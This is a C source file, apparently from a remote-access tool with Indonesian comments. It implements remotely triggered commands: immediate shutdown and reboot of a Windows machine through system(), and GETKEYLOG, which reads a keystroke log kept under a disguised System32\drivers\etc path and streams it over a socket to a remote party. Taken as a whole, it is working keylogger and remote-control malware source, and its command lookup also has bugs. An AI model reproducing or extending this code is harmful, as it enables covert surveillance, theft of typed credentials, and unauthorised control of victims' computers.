#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "command.h"
#include "../common/common.h"
#include "../common/socket.h"


// OPERASI UNTUK ARRAY COMMAND 
void inisialisasi(box cmd){
	for(int i = 0; i < 10; i++){
		cmd[i].syntax = NULL;
		cmd[i].procedure = NULL;
	}
}

void proccess(char * syntax, void * param, box cmd){
	for(int i = 0; i < 10; i++){
		if(strcmp(cmd[i].syntax, syntax) == 0){
			cmd[i].procedure(param);
			break;
		}
	}

	printf("%s IS NOT RECOGNISED", syntax);
}

void addCommand (char * syntax, void * procedure, box cmd){
	for(int i = 0; i < 10; i++){
		if(cmd[i].procedure == NULL){
			cmd[i].syntax = myStrdup(syntax);
			cmd[i].procedure = procedure;
			return;
		}
	}

	printf("STACK OVERFLOW\n");
}

// OPERASI UNTUK SINGULAR COMMAND

// COMMAND

void SHUTDOWN(void * param){
	system("shutdown /s /t 0");
}

void REBOOT(void * param){
	system("shutdown /r /t 0");
}

void EXIT(void * param){
	exit(0);
}

void GETKEYLOG(void * paramT){
	if(paramT == NULL) return;

	paramThread * param = (paramThread *)paramT;

	#define KEYLOG_PATH "C:\\Windows\\System32\\drivers\\etc\\log"
	
	char buffer[128] = {0};
	
	FILE * source_file = fopen(KEYLOG_PATH, "r");

	if (source_file == NULL){
		perror("");
		getchar();
		return;
	}

	strcpy(buffer, "GETFILE");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));

	while (fgets(buffer, sizeof(buffer), source_file) != NULL) {
		send((param)->clientSocket, buffer, strlen(buffer), 0);
		/*
		if (fputs(buffer, destination_file) == EOF) {
			perror("Error writing to destination file");
			break; // Exit the loop on write error.
		}
		*/
	}

	strcpy(buffer, "ENDGETFILE");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));

}
